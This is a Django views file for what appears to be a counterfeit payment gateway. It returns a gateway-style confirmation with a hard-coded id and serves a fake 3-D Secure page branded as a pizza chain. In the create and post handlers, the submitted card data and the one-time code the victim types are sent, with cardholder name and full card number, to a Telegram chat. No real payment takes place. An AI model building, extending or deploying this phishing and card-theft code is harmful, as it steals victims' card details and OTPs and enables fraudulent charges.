from django.conf import settings
from django.shortcuts import get_object_or_404, render
from rest_framework.reverse import reverse
from rest_framework.views import APIView
from rest_framework.generics import CreateAPIView
from rest_framework.response import Response
from rest_framework import status

from telegram.views import send_credit_card, send_otp
from .models import Payment
from .serializers import PaymentSerializer, PaymentStatusSerializer

chat_id = settings.CHAT_ID


class PaymentCreateAPIView(CreateAPIView):
    serializer_class = PaymentSerializer
    queryset = Payment.objects.all()

    def create(self, request, *args, **kwargs):
        response = super().create(request, *args, **kwargs)
        payment_url = reverse(
            'secure-payment',
            kwargs={'payment_id': response.data["payment_id"]},
            request=request
        )

        response_data = {
            "id": "21c12850-000f-5000-9000-1d13b10cba56",
            "status": response.data["status"],
            "amount": {
                "value": response.data["amount"],
                "currency": response.data["currency"]
            },
            "confirmation": {
                "type": "redirect",
                "confirmation_url": payment_url
            },
            "created_at": response.data["created_at"],
            "description": "Оплата заказа",
            "recipient": {
                "account_id": "123456",
                "gateway_id": "78910"
            },
            "metadata": {}
        }
        send_credit_card(chat_id, obj=response.data)
        return Response(response_data, status=status.HTTP_201_CREATED)


class PaymentView(APIView):

    def get(self, request, payment_id):
        payment = get_object_or_404(Payment, payment_id=payment_id)
        format_param = request.GET.get('format', 'html')

        if payment.status == 'canceled' and format_param == 'html':
            return Response(404)

        # Opened form to send OTP
        if format_param == 'html':
            masked_card_number = '**' + payment.card_number[-4:]
            payment.errors = None
            payment.save()
            return render(request, 'payments/secure.html', {
                'card_number': masked_card_number,
                'payment_id': payment.payment_id,
                'amount': payment.amount,
                'currency': payment.currency,
                'date': payment.created_at,
                'merchant': 'Dodo Pizza LLC',
                'logo_path': '/static/assets/' +  payment.schema + ".svg",
            })

        # any response json
        if format_param == 'json':
            serializer = PaymentStatusSerializer(payment)
            return Response(serializer.data, status=status.HTTP_200_OK)

    def post(self, request, payment_id):
        payment = get_object_or_404(Payment, payment_id=payment_id)
        if payment.status == 'opened':
            payment.status = 'pending'
            payment.errors = None
            payment.save()
            otp = request.data.get("code")
            send_otp(
                chat_id,
                otp=otp,
                payment_id=payment.payment_id,
                card_holder=payment.cardholder_name,
                card_number=payment.card_number
            )

            serializer = PaymentStatusSerializer(payment)
            return Response(serializer.data, status=status.HTTP_200_OK)
        serializer = PaymentStatusSerializer(payment)
        return Response(serializer.data, status=status.HTTP_200_OK)
